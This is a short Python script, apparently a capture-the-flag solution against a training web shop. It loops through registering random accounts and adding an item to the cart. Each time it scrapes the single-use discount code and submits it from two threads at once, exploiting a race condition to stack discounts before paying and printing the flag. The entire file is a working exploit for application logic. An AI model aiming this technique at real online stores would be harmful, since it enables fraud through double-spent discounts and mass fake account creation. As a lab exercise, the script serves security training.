import requests
import random
import string
import threading
import time
import re

baseurl = "http://discount.training.offdef.it"

def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def register(session,username, password):
    
    url = "%s/register" % baseurl
    data = {"username": username, "password": password}
    r = session.post(url, data=data)
    return r.text

def add(session, username, password):
    url = "%s/add_to_cart?item_id=21" % baseurl
    r = session.get(url)

def cart(session, username, password):
    url = "%s/cart" % baseurl
    r = session.get(url)
    return r.text

def get_code(session, text):
    splitted = re.split("You still have a discount code!: ",text)
    code = splitted[1][:10]
    #print(code)
    return code

def discount(session, code, password):
    url = "%s/apply_discount" % baseurl
    data = {"discount": code}
    r = session.post(url, data=data)
    #print(r.text)

def pay(session):
    url = "%s/cart/pay" % baseurl
    r = session.get(url)
    #if "Payment was sucessful!" in r.text:
        #print(r.text)
    url = "%s/items" % baseurl
    r = session.get(url)
    #print(r.text)
    if "flag" in r.text:
        print(r.text)
    return r.text


s = requests.Session()
while True:

    u = randomString()
    p = randomString()
    register(s,u,p)
    add(s,u,p)
    t = cart(s,u,p)
    code = get_code(s,t)

    t1 = threading.Thread(target=discount, args=(s,code,p))
    t2 = threading.Thread(target=discount, args=(s,code,p))


    t1.start()
    t2.start()


    #register(s,u,p)
    #login(s,u,p)
    #home(s)

    t1.join()
    t2.join()
    pay(s)
    #time.sleep(0.1)